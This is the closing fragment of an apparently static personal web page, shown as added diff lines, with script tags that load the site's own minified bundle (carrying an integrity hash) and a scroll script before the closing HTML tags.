+<script type=text/javascript src=https://ceso.github.io/bundle.min.59ecdc8ddd50b30e6dd7ad4a5372c3fd24a26db671cc1575443b150ceb9d4bc8e73618fb298596b5c336cf5d8c2db90bd7e72a648479e97884e5398722f962fa.js integrity="sha512-Wezcjd1Qsw5t161KU3LD/SSibbZxzBV1RDsVDOudS8jnNhj7KYWWtcM2z12MLbkL1+cqZIR56XiE5TmHIvli+g=="></script>
+<script src=https://ceso.github.io/js/scroll.js></script>
+</body>
+</html>
